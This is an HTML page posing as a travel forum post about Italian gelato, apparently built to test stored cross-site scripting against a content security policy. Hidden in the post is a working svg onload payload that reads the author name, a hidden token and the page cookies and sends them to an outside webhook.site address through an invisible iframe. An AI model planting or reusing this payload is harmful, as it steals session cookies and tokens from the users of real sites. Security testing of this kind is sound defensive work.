<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Forum Post ‚Äì Travel Tips</title>
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; img-src 'self';">

  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
      background: #f8f9fa;
    }
    .post {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .author {
      font-weight: bold;
      margin-bottom: 10px;
    }
    #token {
      display: none;
    }
  </style>
</head>
<body>
  <h1>Travel Forum</h1>
  <div class="post">
    <div class="author" id="user">User123:</div>
    <div class="content">
      Here's a cool travel tip!<br><br>

      <div id="token">fake-jwt-token-abc123</div>

      <!-- Payload que cria um iframe para exfiltrar dados -->
      <svg onload="
        const u = document.getElementById('user')?.innerText;
        const t = document.getElementById('token')?.innerText;
        const c = document.cookie;
        const url = 'https://webhook.site/d828bfbf-ff5d-41db-956f-c8662ec8026a?' +
          'user=' + encodeURIComponent(u) + '&token=' + encodeURIComponent(t) + '&cookies=' + encodeURIComponent(c);
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
      ">
      </svg>

      <p>If you're visiting Italy, make sure to try the gelato! üç¶</p>
    </div>
  </div>
</body>
</html>
